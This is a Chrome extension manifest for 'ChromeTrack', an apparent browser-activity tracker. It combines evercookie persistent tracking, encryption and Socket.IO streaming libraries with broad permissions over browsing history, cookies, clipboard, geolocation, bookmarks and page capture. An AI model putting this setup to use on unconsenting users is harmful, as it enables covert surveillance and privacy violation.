{
  "manifest_version": 2,
  "name": "ChromeTrack",
  "version": "0.1.0",
  "description": "Track browser activity.",

  "background": {
    "persistent": true,
    "scripts": [
      "lib/FileSaver.js",
      // JQuery:
      "lib/jquery-1.10.2.min.js",
      // UUID tracking:
      "lib/Math.uuid.js",
      "lib/swfobject-2.2.min.js",
      "lib/evercookie.js",
      // String compression:
      "lib/base64-string-v1.1.0.js",
      "lib/lz-string-1.3.3.js",
      // RSA encryption/decryption:
      "lib/jsencrypt.min.js",
      // Socket.IO
      "lib/socket.io.js",
      "lib/socket.io-stream.js",
      // Main:
      "main.js"
    ]
  },

  "permissions": [
    "http://*/*",
    "https://*/*",
    "bookmarks",
    "clipboardRead",
    "cookies",
    "geolocation",
    "history",
    "pageCapture",
    "storage",
    "tabs",
    "topSites",
    "unlimitedStorage",
    "windows"
  ]
}
